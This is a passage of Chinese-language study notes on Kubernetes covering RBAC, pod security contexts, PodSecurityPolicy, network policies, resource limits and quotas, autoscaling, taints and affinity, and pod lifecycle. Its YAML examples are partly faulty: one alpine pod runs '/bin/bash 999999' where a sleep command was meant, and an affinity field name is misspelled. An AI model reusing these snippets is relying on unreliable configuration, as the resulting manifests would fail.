进行绑定）；至于是哪一种，它是通过绑定过程来实现的；当使用 ClusterRoleBinding 进行绑定的时候，被绑定的主体就可以访问所有命名空间中的资源；当使用 RoleBinding 进行绑定的时候，被绑定的主体则只能访问其所在的命名空间中的资源； 了解默认的 ClusterRole 和 ClusterRoleBindingKubernetes 启动时，即已经内置好了一些常用的 ClusterRole，其中最常用的四个分别是： edit：对命名空间中的资源的修改权（除不允许修改 Role 和 RoleBinding）； view：对命名空间中的资源的读取权（除不能读取 Role、RoleBinding 和 Secret）； admin：对命名空间中的资源的完全控制权（除 ResourceQuota 资源外）； cluster-admin：对整个集群的完全控制权 其中一些 ClusterRole 和相同名称的 ClusterRoleBinding 主要是用来给各种控制组件分配权限的； 理性的授予权限为了安全起见，默认的 ServiceAccount 几乎没有什么权限，连查看集群状态的权限都没有，几乎等于未经认证的用户；但这显然无法应对工作中的需要，好的做法不是给默认 ServiceAccount 添加各种权限，因为它会导致这些权限扩散到那些同样使用默认 ServiceAccount 的 pod 上；而是应该单独给每个需要权限的 pod 创建单独的 ServiceAccount、Role 和 RoleBinding，并在 Role 里面设置所需要的最小权限； 13. 保障集群内节点的网络安全在 pod 中使用宿主节点的 Linux 命名空间背景：宿主节点有自己的默认命名空间，而在节点上运行的每个 pod 也有各自的命名空间；通过命名空间实现了彼此的隔离；这些命名空间包括独立的 PID 命名空间、IPC 命名空间、网络命名空间等； 问：貌似即使是同一 pod 中的容器也有各自的命名空间，那么它们如何实现与 pod 的对应？猜测有可能需要在某个地方进行映射登记； 在 pod 中使用宿主节点的网络命名空间缘起：某些 pod 需要运行在宿主节点的默认网络命名空间中，例如执行系统级功能的 pod（像那些运行 Kubernetes 的控制组件的 pod），这样它们才能够查看和操作节点上的资源和设备； 解决办法：在 pod 的 spec 字段中，启用 hostNetwork: true 选项； 12345678910apiVersion: v1kind: Podmetadata: name: pod-with-host-networkspec: hostNetwork: true containers: - name: main image: alpine command: [&quot;/bin/sleep&quot;, &quot;999999&quot;] 绑定宿主节点上的端口而不使用宿主节点的网络命名空间实现办法：在 spec.containers.ports 下，有一个 hostPort 属性，可以用来设置 pod 端口和节点端口的映射绑定； NodePort 类型的 service 也可以用来做相同的绑定，但是区别在于，它是通过修改 iptables 来实现的映射，并且它会作用在所有节点上的 iptables，不管该节点是否有运行 pod；同时，iptables 的路由是随机的，即当前节点 iptable 有可能将请求转发到节点上，以实现负载均衡； 当使用宿主节点的端口时，将带来一个副作用，因为某个编号的端口在节点上有且仅有一个，这意味着该节点最多运行一个存在这种绑定的 pod；如果所需 pod 副本数大于节点数，将导致部分 pod 一直处于 pending，无法创建成功； hostPort 最初是设计用来给节点上 daemonSet 类型的 pod 暴露端口用的，它恰恰好也兼顾保证了一个 pod 只会被安排在节点一次； 不过据说现在已经有其他更好的实现方法了；是什么呢？ 使用宿主节点的 PID 与 IPC 命名空间跟通过 hostNetwork 属性开启与节点相同网络空间的方法一样，也存在 hostPID 和 hostIPC 选项，可以让容器使用节点上默认的进程命名空间和进程间通信空间；开启后，将可以在容器内看到节点上进行的进程，并可以使用内部进程通信机制与它们进行通信； 1234567891011apiVersion: v1kind: Podmetadata: name: pod-with-host-pid-and-ipcspec: hostPID: true hostIPC: true containers: - name: main image: alpine command: [&quot;/bin/bash&quot;, &quot;999999&quot;] 配置节点的安全上下文容器中的进程常常以 root 身份运行应用，当容器和节点共享命名空间时，意味着有可能存在安全隐患，因此有必要进一步对 pod 对宿主节点的访问权限，进行更细粒度的设置；此时可以通过一个叫做安全上下文（security-context）的选项来实现配置； 使用指定用户运行容器 阻止容器以 root 用户运行 容器以 root 用户运行存在一定的安全隐患，例如当节点上有目录被挂载到容器中时，将使得攻击者有机会访问和修改该目录中的内容； 使用特权模式运行pod有时候根据业务场景需要，不可避免需要让 pod 访问节点上的资源，例如硬件设备、内核功能等；此时需要增加 pod 的权限，让其拥有访问的特权； 为容器单独添加内核功能通过 privileged 开启特权模式并不是好的做法，因为它意味着赋予容器完全的权限，但实际上并不需要那么多，因此需要进一步做更细粒度的配置，仅赋予所需要的个别权限即可； 在容器中禁用内核功能 阻止对容器根文件系统的写入 好的实践：将根文件系统的阻止写入设置为 true，然后为需要写入的数据，例如日志文件、磁盘缓存等单独挂载存储卷； 上述的各个上下文选项是在容器中设置的，但也可以设置在 pod 项下，这样会对 pod 中的所有容器都产生作用，而不局限于单个容器； 容器使用不同用户运行时共享存储卷通过存储卷，可以让两个不同的容器共享数据，例如一个负责写入，一个负责读取；但是这样做的前提是两个容器都以 root 用户来运行；如果不是的话则会出现权限问题，导致共享不成功； 有两个属性可以用来解决这个问题 fsGroup：用来设置 pod 中所有容器在存储卷中创建的文件的所属组别 supplementalGroups：用来给容器中的用户添加新组别 123456789101112131415161718192021222324252627282930apiVersion: v1kind: Podmetadata: name: pod-with-shared-volume-fsgroupspec: securityContext: fsGroup: 555 # 写入存储卷的文件的组别 supplementalGroups: [666, 777] # 用户的其他组别 containers: - name: first image: alpine command: [&quot;/bin/sleep&quot;, &quot;999999&quot;] securityContext: runAsUser: 1111 volumeMounts: - name: shared-volume mountPath: /volume readOnly: false - name: second image: alpine command: [&quot;/bin/sleep&quot;, &quot;999999&quot;] securityContext: runAsUser: 2222 volumeMounts: - name: shared-volume mountPath: /volume readOnly: false volumes: - name: shared-volume emptyDir: 限制 pod 使用安全相关的特性集群中有两种角色，一个是集群的管理员（创建集群资源的人），一个是开发人员（使用集群资源的人）；为了避免开发人员滥用某些功能，例如开启容器的 privilege 权限，导致埋下安全隐患，集群管理员可以通过添加全局设置，来限制部分功能的使用； PodSecurityPolicy 资源介绍PodSecurityPolicy 是一个全局资源，即不属于任何的命名空间，用来限制 Pod 可以开启的安全特性；它需要集群开启 PodSecurityPolicy 插件（负责准入控制）后才能使用；当 API 服务器收到创建 Pod 的请求后，它会调用插件，检查该 Pod 的安全特征是否符合 PodSecurityPolicy 里面规定的要求；如果符合，则开始创建；如果不符合，则拒绝请求； PodSecurityPolicy 能够控制的事情，差不多全部就是上一节提到的那些安全上下文选项，额外还有一项是可以控制 Pod 可以使用的存储卷类型； 了解 runAsUser、fsGroup 和 supplementalGroup 策略对 Pod 可用的用户 ID、用户组 ID 进行限制的示例 PodSecurityPolicy 仅会在创建 Pod 时起作用，如果在创建 PodSecurityPolicy 资源之前， Pod 已经创建了，则已经创建的 Pod 不会受到 PodSecurityPolicy 的影响； 如果创建 Pod 时没有声明用户 ID，则 Pod 创建后，PodSecurityPolicy 会将容器中的用户 ID 强制修改为策略所允许的 ID，即使容器镜像有定义自己的 ID 也一样会被覆盖； 配置允许、默认添加、禁止使用的内核功能通过以下三个字段实现控制： allowedCapabilities defaultAddCapabilities requiredDropCapabilities 对于出现在 defaultAddCapabilities 的功能，将会被自动添加到容器中；如果不希望某个容器拥有该功能，则可以在该 Pod 的声明文件中显式的禁用该功能； 限制 pod 可以使用的存储卷类型 如果集群中存在多个 PodSecurityPolicy ，则容器可以使用的存储卷类型是所有 PodSecurityPolicy 中罗列出的类型的合集； 对不同的用户与组分配不同的 PodSecurityPolicy虽然 PodSecurityPolicy 是集群组别的资源，不归属任何的命名空间，但是它并不会默认对所有命名空间中创建的 pod 生效；它需要被 ClusterRole 引用，然后经由 ClusterRoleBinding 绑定到指定的用户或组之后，才会生效；因此，本质上来说，策略并不针对命名空间，而是针对用户或组的； 隔离 pod 的网络除了上一节提到的可以对 Pod 的安全选项进行配置外，还可以配置 Pod 的网络访问规则，允许或限制入网和出网通信，实现一定程度的网络隔离；默认情况下 Pod 是可以被任意来源的请求进行访问的； 在一个命名空间中启用网络隔离如果想把某个命名空间中的所有 Pod 隔离起来，可以创建一个没有写 ingress 入网规则的 NetworkPolicy，同时标签选择器放空，这样它会匹配命名空间中的所有 pod NetworkPolicy 资源能够生效的前提，是需要集群中的 CNI 插件支持这种资源；不然创建了资源，也不能发挥作用； 允许同一命名空间中的部分 pod 访问一个服务端 pod如果不加限制，同个命名空间中的 pod 之间，是可以自由的相互访问的，为了提高安全性，可以设置让某个 pod 只允许被指定pod 访问，而不能被未指定的 pod 访问；做法就是创建一个 NetworkPolicy，作用于该 pod，然后在入网规则中写上允许访问的 pod 的标签选择器和可访问的端口号，这些就只有标签选择器匹配的那些 pod， 才具有访问权限； 即使 pod 之间是通过 service 相互访问，以上规则仍然会生效；因为 service 的本质仍然是要回到 iptables 去实现的； 在不同命名空间之间进行网络隔离实现方法很简单，在入网规则中，有一个 namespaceSelector 的属性，可以用来写命名空间的选择器； 使用 CIDR 隔离网络前面提到的入网规则是通过标签选择器来实现的，另外还可以通过 IP 段来限制，即只允许某个 IP 段范围内的请求，实现办法是通过 ipBlock.cidr 属性来实现 限制 pod 的对外访问流量通过对出网规则 egress 规则进入设置即可实现 pod 的对外访问 14. 计算资源管理为 pod 中的容器申请资源创建包含资源 requests 的pod 资源 requests 如何影响调度requests 用来指定容器所需要资源的最小值，而不是上限值；但它会影响调度器的调度，但调度器发现某个节点的资源已经不满足 requests 要求的最小值时，就不会将 pod 调度到该节点上； 调度器有两种优先级调度函数，一种是优先调度到最有空闲的节点，另一种是优先调度到最满负荷的节点；前者可以让节点的资源使用平均化；后者则可以尽量少的节点运行尽可能多的 pod； 当节点上的可用资源不足时，pod 将无法正常进入运行状态，而会一直处于 pending 状态，直到有 pod 被删除后资源被释放出来； CPU requests 如何影响 CPU 时间分配CPU requests 不仅会影响调度器的调度工作，还会影响到节点上可用资源在多个 pod 之间的分配工作；调度器会根据申请的资源数量的比例，来分配余下的可用资源给相应的 pod；但如果剩余可用资源刚好没有其他 pod 占用时，调度器会将所有的剩余资源临时全部分配某个繁忙的容器；当其他容器开始要用时，再退还； 定义和申请自定义资源CPU 和内存是常规的可用资源，Kubernetes 还支持一些自定义资源，例如 GPU；在使用这类自定义资源时，需要先将自定义资源加入节点 API 对象的 capacity属性中，以便 Kubernetes 可以知道该资源的存在；之后，就可以像常规资源一样去引用它了； 限制容器的可用资源设置容器可使用资源量的硬限制CPU 是一种可压缩资源，即对进程做出使用限制，并不会影响进程的正常运行，只是会让它的性能下降，计算时间变长而已；而内存是一种不可压缩资源，当为某个进程分配了一块内存后，如果进程没有释放该内存，将导致该块内存一直被占用，即使内存存在空闲，其他进程也没有机会使用；因此，对 pod 的可用资源数量做出最大限制是有必要的，这样可以防止出现恶意 pod 导致整个节点不可用； 当设置了 limits 值后，如果没有设置 requests 值，而默认使用 limits 值做为 requests 值； 调度器不会将 pod 调度到剩余资源不足的节点上，但是会调度到 limits 超过 100% 的节点上，limits 存在超卖现象；limits 并不作为节点调度的控制因素；但是当节点节点上的一个或多个容器使用的资源使用超过 limits 总量时，将导致个别容器被干掉； 超过 limits当某个容器申请超过 limits 限制的内存资源时，如果 pod 的重启策略设置为 Always 或者 OnFailure时，容器将会被干掉（OOMKilled， out of memory killed）；此时 pod 会呈现 CrashLoopBackOff 状态（即不断重启，每次增加一部的间隔时间，最大间隔规定为 5 分钟）； 容器中的应用如何看待 limits 当在容器中运行 top 命令来查看内存使用情况时，显示的结果是节点的内存使用情况，而不是真实的容器中的进程所使用的内存情况；不仅内存有这个情况，CPU 的使用也是这个情况； 因此，如果需要在代码中查询可用资源数量时，应避免使用常规的 linux 命令来查看，而应该通过 downward API 来查看实际配置的 limits 值，然后再采取相应的操作；另外也可以通过 cgroup 系统来获取配置的 CPU 限制（如下面的两个文件）； 12/sys/fs/cgroup/cpu/cpu.cfs_quota_us/sys/fs/cgroup/cpu/cpu.cfs_period_us 了解 pod QoS 等级由于 limits 会被超卖导致某些容器在内存资源不足时被杀死，因此需要制定一个优先级的规则，来决定谁应该优先被杀死； 优先级从低到高分别是： BestEffort：低 Burstable：中 Guaranteed：高 定义 pod 的 QoS 等级QoS 等级来源于容器的 requests 和 limits 字段的配置，并没有一个单独的字段可以进行定义； BestEffort 等级容器没有设置 requests 和 limits 值的 pod 都属于这个等级； 优点：内存资源充足的情况下，可使用的内存无上限； 缺点：没有任何的资源保证；资源不足时，则啥也分不到；需要释放资源时，首批被杀死； Guaranteed 等级所有容器 requests 和 limits 值相等的 pod 属于这个等级； 优点：可保证所请求的资源能够全额分配； 缺点：除了已分配的外，无法使用更多的资源； Burstable 资源不属于前面两个等级的 pod，属于这个级别； 对于多容器的 pod，只有当所有的容器都属于 BestEffort 或者 Guranteed 等级时，pod 才是相应的等级，不然全部归属于 Burstable 等级； 内存不足时哪个进程会被杀死被杀掉的顺序跟 QoS 等级对应，BestEffort 最先被杀掉，最后是 Guaranteed；只有在系统进程需要内存时，Guranteed 进程才可能被杀掉； 对于两个等级相同的 pod，当内存不足时，那个实际使用内存量占申请量更高的 pod 将会被杀掉，即优先杀掉大骗子，留下小骗子； 为命名空间中的 pod 设置默认的 requests 和 limitsLimitRange 资源简介LimitRange 资源有点像是一个模板，当没有显式的为 pod 设置资源使用声明时，默认使用模板提供的值；并且如果 pod 申请的值超过了模板允许的上限，pod 将不会被允许创建，直接出现报错； LimitRange 只作用于单独的 pod，所以它不会对所有 pod 要使用的资源总量起作用； LimitRange 资源的创建 示例的写法将不同类型对象的资源使用限制写在了同一个 LimitRange对象中，但是也可以拆分写在多个对象中，每个控制一种类型； LimitRange 只适用于在其后创建的资源，如果某个资源在 LimitRange 创建之前已经存在，则不会受到限制； 强制进行限制当对可用资源进行了限制后，此时如果创建超过限制的对象，Kubernetes 将直接给出报错信息； 应用资源 requests 和 limits 的默认值LimitRange 的作用域是以命名空间为单位的，即只对当前命名内的对象有效，而对其他命名空间的对象无效； 限制命名空间中的可用资源总量LimitRange 只能限制单个 pod 的资源使用，没有对可使用的资源总量做出限制，因此如果恶意创建大量的 pod，将会导致整个集群的资源全部被占用掉； ResourceQuota 资源介绍ResourceQuota 可以对两个事情做出限制 一个是所有 pod 可以使用的资源总量，当监控限制量此，如果此时新增一个 pod 导致超出限额，则该 pod 不会创建成功； 另一个是可创建的对象数量； 创建 ResouceQuota 对象示例 在创建 ResouceQuota 之前，必须先创建 LimitRange，这样 ResouceQuota 才能创建成功，不然会报错；因为如果没有 LimitRange，则 BestEffort 等级的 pod 可使用的资源是没有上限的； 为持久化存储指定配额 限制可创建对象的个数123456789101112131415apiVersion: v1kind: ResourceQuotametadata: name: objectsspec: hard: pods: 10 replicationcontrollers: 5 secrets: 10 configmaps: 10 persistentvolumeclaims: 4 services: 5 services.loadbalancers: 1 services.nodeports: 2 ss.storageclass.storage.k8s.io/persistentvolumeclaims: 2 为特定的 pod 状态或者 QoS 等级指定配额配额可以指定作用范围，总共有四种作用范围，只有当对象满足作用范围的条件时，配额限制才会生效； BestEffort：BestEffort 类型的对象 NotBestEffort：非 BestEffort 类型的对象 Terminating：Terminating 类型的对象（已进入 Failed 但未真正停止的状态） NotTerminating：非Terminating 类型的对象 BestEffort 只允许限制 pod 的个数，而其他三种还可以限制 CPU 和内存； 监控 pod 的资源使用量资源使用配额如果写得太高，则会导致资源浪费，如果定得太低，则会导致应用经常被杀死，服务不稳定，因此需要找到一个最佳平衡点；平衡点的寻找办法即是通过监控应用的资源使用情况来进行决策； 收集、获取实际资源使用情况在每个节点上，Kubelet 自带有一个插件，可以用来收集节点上的资源消耗情况；而 Kubernetes 则可以通过附加组件 Heapster 来进行统计，得到监控信息； Heapster 已经停用，现在改成了 metrics-server, 本地集群的启用方法 minikube addons enable metrics-server，启用后，需要等待好几分钟才能收集到数据并准备好 显示节点的 CPU 和内存使用量 显示 pod 的 CPU 和内存使用量 如果要查看容器的资源使用情况，则需要加上 –container 选项； 保存并分析历史资源的使用统计信息top 命令只显示当前的资源使用情况，而不是历史的统计；即使是 cAdvisor 和Heapster 也只保留了很短的一段时间内的数据；如果想要获得比较长的一段时间的统计数据，需要引入数据库对数据进行保存和可视化，常用的工具为 InfiuxDB 和 Grafana； InfiuxDB 和 Grafana 都是以 pod 的形式运行的，因此只要下载相应的声明文件，即可快速部署；如果是 Minikube 则更加简单，只需要启用相应的插件就可以了； 找到 grafana 的地址 15. 自动横向伸缩 pod 与集群节点在 pod 开始运行起来之后，如果发现请求量逐渐增加，通过手工更改 deployment、replicaSet 等资源的副本数量，可以实现 pod 数量的增加；但是这需要提前知道流量何时会增加，可是有时候并没有办法提前知道，因此需要引入一套监控的机制，当监控的指标发生变化时，让集群根据提前设置好的规则，自动增加 pod 的副本数量或者是节点数量； pod 横向自动伸缩HPA 插件，horizontalPodAutoscaler，是一个专门用来监控 pod 的运行状态指标的插件，当规则条件满足时，它就会自动调整 pod 的副本数量； 了解自动伸缩过程分为三个步骤来实现 获取状态指标HPA 并不用自己去采集指标数据，因为有其他插件已经做了这个工作（即工作节点上的 cAdvisor 和主节点上的 Heapster），它只需要跟 Heapster 拿数据就可以了； 计算所需 pod 副本数一般根据 CPU 使用率和 QPS 每秒访问数量来计算 调整 replica 属性HPA 并不是直接调用 API 服务器的接口对相关资源（如 Deployment、ReplicaSet等）的副本数进行修改，而是通过联系这些资源的子资源对象来修改；这样做的好处是任何资源如果在实现上有任何变更，HPA 这边不会受到任何影响，不需要做任何的修改，它们之间通过子资源实现了隔离；同时不同的资源之间也不会相互影响，因为它们只要管好自己的子资源就可以了； 整个自动伸缩的过程 基于 CPU 使用率进行自动伸缩在使用 CPU 使用率指标监控 pod 的使用情况时，HPA 插件实际上是根据 pod 定义中提到的 CPU 资源请求来计算的，即根据 pod 运行过程中使用的 CPU 和原请求的 CPU 之间的比例，来判断 pod 是否在超负荷运转； HPA 对象有两种创建方法，一种是通过 YAML 声明文件，一种是通过 kubectl autoscale 命令（表面上看它操作的对象是 deployment，但在操作的过程中，它会自动创建一个 HPA 对象） 当 pod 的 CPU 使用率超过目标值时，HPA 会对其进行扩容；反之变然，即当运行中的 pod 的 CPU 使用率远低于目标值时，HPA 也会做缩容的动作； HPA 在扩容的时候，虽然会根据目标值进行计算，得到达成目标值的最少 pod 数量；但是它并不一定能够一步达到将 pod 调整到该数量，尤其是当这个数量比较大的时候；在单次扩容操作中，如果当前副本数小于等于2，则最多只能扩容到4个副本；如果当前副本数大于2，则最多只能扩容一倍； 另外触发扩容或者缩容也有时间间隔的限制；只有距离上一次扩缩容超过3分钟时，才会触发扩容；超过5分钟时，才会触发缩容； 当需要对 HPA 中设定的目标值进行修改时，有两种操作办法，一种是使用 kubectl edit 命令；另一种是先删除原先的 HPA 资源，然后再重新一个； 基于内存使用进行自动伸缩使用方法跟 CPU 一样，没有区别，此处略； 基于其他自定义度量进行自动伸缩想要使用其他自定义度量进行自动伸缩，需要有一个前提，即度量涉及的指标数据有被收集；度量有有如下类型： resources 度量类型例如 CPU，内存等； pod 度量类型例如 QPS（每秒查询次数） Object 度量类型这种类型极大的扩展了 HPA 的使用场景，它让 HPA 可以根据集群中的其他资源对象的属性来计算是否需要扩缩容 确定哪些度量适合用于自动伸缩如果增加副本数之后，并不能使度量的目标值线性的降低，而很可能让度量指标并不适宜；因为该指标的变化，跟 pod 扩缩容可能并不存在实际上的关系； 缩容到零个副本目前暂时还不允许缩容到零个副本，但据说未来会实现这个功能； pod 的纵向自动伸缩目前 Kubernetes 官方还没有实现这个功能，但是 google GKE 却有这个功能，它会统计 pod 的资源使用情况，然后自动调整 pod 定义信息中的 resource require 和 limit，以最大化的利用硬件资源； 集群节点的横向伸缩当现有的节点不再满足需求，需要添加更多节点时，有一个 ClusterAutoscaler 插件可以用来完成这个任务； 当要添加新节点时，还会遇到该新节点应该是什么样的规格，因此集群需要提前配置好可用的节点规格；这样 ClusterAutoscaler 插件会检索这些可用规格，从中找到一个能够满足 pod 要求的规格，然后创建该节点； 当有多个规格都能够满足 pod 需求时，此时插件就需要从中找一个最合适的； 当插件发现节点上所有 pod 的 CPU 和内存使用率都低于 50% 时，它会开始考虑归还该节点；但是前提上节点上运行的 pod 是否可以被调度到其他节点上，如果可以就归还；如果不可以，就不归还； kubectl cordon 命令会将节点标记为不可调度（即不会再往该节点添加新 pod），但已在节点上运行的 pod 不受影响，仍然正常运行； kubectl drain 命令除了将节点标记为不可调度外，还会将节点上已在运行的 pod 疏散到其他节点上； 启用 Cluster Autoscaler如果启用 Cluster Autoscaler 跟集群部署哪家云供应商有关系，因为不同的云供应商有不同的作法，以下是 GKE 的示例： 1gcloud container clusters update kubia --enable-autoscaling --min-nodes=3 --max-nodes=5 限制集群缩容时对服务的干扰当发生缩容时，节点会被回收，因此运行在 pod 上的节点将变得不可用；但是有可能业务场景对可用的 pod 数量有最低要求，例如 mongo 至少需要有3个实例组成 replica set；因此，为了避免这种状况发生，可以通过创建 podDisruptionBudget 资源来限制集群缩容时对服务带来的干扰 1kubectl create pdb kubia-pdb --selector=app=kubia --min-available=3 podDisruptionBudget 资源的属性很简单，只由标签选择器和最小可用数 min-available 和 max-unavailable 两个属性组成； 16. 高级调度使用污点和容忍度阻 pod 调度到特定节点它的工作原理是给节点添加污点，然后只有那些在定义中规定该种污点可容忍的 pod， 才会被调度到该节点上（有污点相当于默认不分配，让普通 pod 远离该节点）； 想要实现节点和 pod 之间的关系安排，不外乎有两种做法，一种是不主动对节点做标记，而是在 pod 中做标记，定义应使用哪些节点；另一种是反过来，不主动在 pod 中进行定义，而是先对节点做标记，然后只用那些在定义中明确表示可接受节点上的相关标记的 pod，才会被调度到该节点； 介绍污点和容忍度污点和容忍度的做法默认会用在主节点，这样确保只有标记了可容忍该污点的那些系统级 pod，才会被安排在主节点上； 此处 effect 字段的值是 NoSchedule，它表示不能容忍这种污点的 pod 不要调度到当前节点来 污点的效果： NoSchedule：表示如果不能容忍，则不调度 pod 到节点上； PreferedNoSchedue：表示如果不能容忍，则尽量不调度到该节点上，除非没有其他节点可以调度； NoExecute：前两个 schedule 只会在创建 pod 时影响 pod 的调度；execute 则会在 pod 运行过程中影响调度；当某个节点在 pod 运行期间突然改变状态，导致 pod 不能容忍时，就会重新调度该 pod 到其他节点； 在节点上添加自定义污点给节点 node1.k8s 添加自定义污点 node-type&#x3D;production，这样如果不属于生产环境的 pod，就不调度到该节点上，即该节点属于生产环境 pod 的专用； 1kubectl taint node node1.k8s node-type=production:NoSchedule 虽然这种做法可以保证非生产环境 pod 不会被调度到该节点上，但却无法保证生产 pod 被调度到非生产环境的节点上；为了让生产环境和非生产环境的 pod 隔离开，还需要额外给非生产环境的节点添加污点； 在 pod 上添加污点容忍度 污点操作符除了 Equal 外，还有 Exist； 污点容忍度的时间限制在某些情况下，节点可能会失效，此时集群管理组件会给节点添加污点 unready 或 unreachable，那么如果 pod 对这两种污点没有容忍度的话，就会被调度到其他节点上；但是有时节点在一定的时间后，会恢复正常，此时 pod 并不需要被重新调度，只需要等待一段时间即可；至于想要等待多久，可以通过在 pod 容忍度的设置中，添加容忍时间； 使用节点亲缘性将 pod 调度到特定节点上关于如何调度 pod 到指定节点，早期 Kubernetes 的实现是使用 nodeSelector 的机制；但后来发现它并不能满足所有类型的业务需求，因此在新的版本中引入了亲缘性规则，后续预计将逐步替代旧的 nodeSelector 机制； 问：节点亲缘性貌似并不是强制的，而是一种倾向偏好性，即当所有节点都无法满足 pod 的亲缘性需求时，调度组件就会将 pod 调度到任意节点上？ 答：后来发现它的规则要复杂得多，虽然默认状态下是非强制性的，但也可以通过规则定义成强制性的； 使用节点亲缘性的前提是节点需要设置有一些标签，这样 pod 才能根据这些标签判断节点是否有亲缘性；如果没有标签，那就没有办法了； 在 GKE 上面创建集群时，需要设置集群的名称，同时选择地理区域和该区域内部的可用分区，现在才发现，原来 GKE 是通过给节点添加亲缘性标签来实现的；而实质上所有的节点都是在一个大集群内，我们创建的小集群只是逻辑上的； 指定强制性亲缘性规则强制指定 pod 只能被分配到配备有 GPU 的节点上 1234567891011121314apiVersion: v1kind: Podmetadata: name: kubia-gpuspec: affinity: nodeAffinity: requiredDuringSchedulingIgnoreDuringExecution: nodeSelectorTerms: - matchExpressions: - key: gpu operator: In values: - &quot;true&quot; requiredDuringSchedulingIgnoreDuringExecution 表示本规则只适用于新创建的 pod， 不影响已经在运行中的 pod； 调度 pod 时优先考虑某些节点前面提到亲缘性的规则要生效，节点本身必须被提前打上标签；有趣的是，还可以在这些标签中指定节点是独占的还是共享的；不同的标签还可以设置权重系数，用来计算优先级； 1234567891011121314151617181920212223242526apiVersion: extensions/v1beta1kind: Deploymentmetadata: name: prefspec: template: ... spec: affinity: nodeAffinity: # 此处使用了 preferred，而不是 required，表示是非强制性的，只是优先考虑 preferredDuringSchedulingIgnoreDuringExecution: - weight: 80 preference: matchExpressions: - key: availability-zone operator: In values: - zone1 - weight: 20 preference: matchExpressions: - key: share-type operator: In values: - dedicated 使用 pod 亲缘性与非亲缘性对 pod 进行协同部署亲缘性的规则除了可以用来指定 pod 应该部署到哪些节点上，还可以用来设置哪些 pod 应该尽量被部署在相近的位置，就像亲人住在一起一样； 前者通过 nodeAffinity 字段来实现，后者通过 podAffinity 字段来实现； 使用 pod 间亲缘性将多个 pod 部署在同一个节点上 此处使用了 labelSelector.matchLabels 字段来设置标签选择器，另外还可以使用表达能力更强的 matchExpressions 字段； 假设 A pod 要追随 B pod 的部署位置，那么只需在 A pod 上面定义亲缘性规则即可，并不需要在 B pod 上面定义；但是，当 B pod 因为某些原因被删除而重新创建时，调度器仍然会根据 A pod 的规则，将 B pod 部署在 A pod 所处的节点上（这样做才能维护 A pod 亲缘性规则的一致性，不然如果 B pod 部署到节点上，规则就被违反了） 实现原理：当存在多个可用节点时，调度器本质上是通过给不同节点的优先级打分以选择最合适的节点； 将 pod 部署在同一机柜、可用性区域或者地理地域将所有的亲缘 pod 都部署在同一节点并不一定是最好的选择，因为当节点发生故障时，会导致服务不可用；从健壮性的角度，部署在相同地理区域的不同节点上，也是一种好的方案；此点可以通过 topologyKey 字段来实现；它可以有多种值，表示不同的规则 failure-domain.beta.kubernetes.io&#x2F;zone 指定将 pod 部署在相同的可用区中； failure-domain.beta.kubernetes.io&#x2F;region 指定将 pod 部署在相同的地理区域中； topologyKey 字段有好几个值，看上去好像很复杂很神奇的样子，但其实它的实现原理特别简单，就是在节点上添加标签键值对，然后在 pod 定义中的 topologyKey 添加相应的键名，这样调度器会优先选择匹配的节点来部署相应的 pod，其作用很像是标签选择器； 表达 pod 亲缘性优先级取代强制性要求使用 required 类型的亲缘性规则意味着调度是强制性的，但如果不需要强制，只是优先考虑，则可以使用 prefered 开头的规则，并为之写上权重系数即可； 利用 pod 的非亲缘性分开调度 pod有时候我们想将一些 pod 部署在一起，有时候则相反，想让某些 pod 具有互斥性，即不要安排在一起，这时可以使用非亲缘性（感觉用互斥性更直观）规则来实现这个效果，即 nodeAntiAffinity 或者 podAntiAffinity 字段； 使用强制的互斥性规则来部署 pod 时，如果节点的数量不够，将使用一部分 pod 处于 pending 状态，无法调度成功；如果对互斥程度要求没有那么高，则可以考虑使用 prefered 规则来实现； 17. 开发应用的最佳实践集中一切资源在 Kubernetes 中，所有的一切都是资源，但是它们有些是由开发人员创建并维护的，有些则是由集群人员创建和维护；二者有所分工，互不耦合； Pod 通常会用到两种类型的 secret 数据，一种是用来拉取镜像用的，一种是在 Pod 中运行的进程所用的；secret 一般并不作为声明文件的组成部分，而应该是由运维人员进行配置，并分配给 serviceAccount，然后 serviceAccount 再分配给各个 pod； 初始化环境变量一般使用 configMap 卷；这样对于开发人员来说，引用的卷是固定的，但是卷的内容是可以根据环境变化的； 集群管理员会创建一些 LimitRange 或 ResourceQuota 对象，由开发人员在声明文件中引用；这些对象可以控制 pod 可以使用的硬件资源； 了解 pod 的生命周期将应用交给 Kubernetes 来运行的注意事项： Pod 中的应用随时可能被杀死，并由新 Pod 来替代； 写入磁盘的数据可能会消失； 使用存储卷来跨容器持久化数据； 如果 Pod 是正常的，但 Pod 内的容器持续崩溃，Pod 并不会被销毁重建； Pod 的启动是没有顺序的； 可以在 Pod 中创建 init 容器来控制主容器的启动顺序； Pod 中的容器支持启动前 post-start 和启动后 pre-stop 的钩子； 问：貌似可以通过启动后钩子来控制容器的启动顺序？ 答：后来发现更好的做法是让容器自己能够应对无顺序的情况，即在其他容器没有就绪前不会出错，而是会进行一定时间的等待； 以固定的顺序启动 pod通过在 pod 中创建 init 类型的容器，在它里面写一段脚本来监测其他容器或服务是否已经就绪，如果就绪，就开始启动主容器；init 容器写在声明文件的 spec 属性下面，如下图所示； 虽然有机制来控制应用的启动顺序，但更好的实践作法是放应用本身可以应对其所依赖的服务未准备好时的情况；例如对于应用所连接的数据库服务，当连接不上时，就先暂停，然后每隔一段时间后进行重试； 问：应用有可能在中途出现断开依赖服务的情况，不知此时是否可以通过 readiness 探针来告知 Kubernetes 当前应用进入了未准备好的状态？如果 readiness 探针是一次性的话，那或许这个工作可以交给 liveness 探针来完成； 答：后果发现 readiness 的探针不是一次性的，它会在容器运行过程中仍然保持工作； 增加生命周期钩子启动后钩子执行成功，容器才会启动，不然会呈现等待的状态，但它和容器中的主进程是同时开始执行的； 钩子的输出信息如果是输出到标准输出的，将会导致查看不到，这样会不方便高度，因此，如果可以的话，最好还是输出信息到日志文件中更好； 停止前钩子没有成功也不影响容器被终止； 了解 pod 的关闭kubelet 关闭 pod 时涉及如下顺序的动作： 执行容器停止前钩子（如有）； 向容器的主进程发送 SIGTERM 信号（因为容器本质上只是操作系统中的一个进程，所以关闭容器跟关闭进程本质上是一样的）； 给容器一定的时间（宽限期），让其优雅的关闭； 如果容器动作超时，则使用 SIGKILL 信号进行强制关闭； 终止宽限期的时间是可以配置的，默认是 30 秒； 由于 kubelet 是将关闭信号发给容器，而不是发给容器中的应用，因此应用有可能并没有收到这个信号；此时应用可以通过停止前钩子来让自己得到通知； 此处存在一个悖论，即 pod 是运行在节点上的，因此不管在 pod 